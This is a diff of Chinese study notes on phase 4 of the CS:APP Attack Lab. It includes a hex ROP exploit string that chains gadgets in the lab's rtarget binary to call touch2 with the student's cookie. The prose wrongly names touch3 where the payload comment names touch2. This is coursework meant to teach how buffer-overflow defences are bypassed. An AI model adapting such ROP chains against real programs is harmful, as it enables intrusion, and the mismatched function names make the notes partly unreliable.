@@ -141,9 +141,66 @@ fa 18 40 00 c3 00 00 00 										 pushq touch3
 
 利用 给定的farm 找到可以用的gadget
 
-需要两个指令
+不知道栈的地址
 
-popq %rax
+需要三个指令
 
-movq %rax ，%rdi
+popq %rax  （弹出八个字节给到rax	拿到cookie）
 
+movq %rax ，%rdi	（传递给touch3参数）
+
+ret	(调用touch3)
+
+可能用到的函数都放在farm.c文件了
+
+刚开始没注意到
+
+想通过rtarget反汇编去找可用的代码段
+
+结果发现不知道在哪里打断点
+
+但farm.c 我们能直观利用的只是可以打断点的函数名罢了
+
+我们还是要去gdb	rtarget
+
+因为将farm.c编译成farm.s 再反汇编得到farm.d是不可行的
+
+因为现在的gcc后得到的farm.d 让这个lab的两种攻击方法都不可行了
+
+对比与level2 我们没用去使用明确的地址
+
+而是利用现有的字节去构筑指令
+
+然后利用寄存器去达到目的
+
+~~~c
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00   /* 补齐至40 */
+ab 19 40 00 00 00 00 00  /* popq rax 0x4019ab 0x4019a7 + 4 */
+fa 97 b9 59 00 00 00 00  /* cookie 的值 */
+
+a2 19 40 00 00 00 00 00  /* 0x4019a2  movq %rax, %rdi 0x4019a0 + 2 */
+ec 17 40 00 00 00 00 00  /* touch2 4017ec */
+~~~
+
+## level_5
+
+就是用ROP完成level3的任务
+
+思路大致和4一致
+
+就是所需的指令更多 更加复杂
+
+引用文档话
+
+~~~c
+Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
+Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.
+~~~
+
+暂时不考虑完成这个
+
+2022-11-29完成lab
